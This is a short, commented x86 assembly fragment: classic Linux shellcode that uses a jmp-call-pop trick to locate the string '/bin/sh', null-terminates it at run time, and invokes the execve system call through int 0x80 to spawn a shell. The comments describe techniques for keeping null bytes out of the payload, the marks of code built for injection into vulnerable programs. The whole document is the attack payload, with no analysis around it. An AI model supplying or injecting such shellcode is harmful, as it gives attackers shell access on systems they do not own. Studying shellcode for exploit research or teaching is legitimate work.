jmp _WANT_BIN_BASH
_GOT_BIN_BASH:
    xor esi, esi #now esi == 0
    push 0x0b
    pop eax #can't use mov instruction, anyway now eax == 0x0b
    pop ebx
    mov [ebx+7], esi #put zero at the end of the string in run time
    mov ecx, esi #just equal zero
    mov edx, esi #just equal zero
    int 0x80
_WANT_BIN_BASH:
    call _GOT_BIN_BASH
    .ascii "/bin/sh@"
    
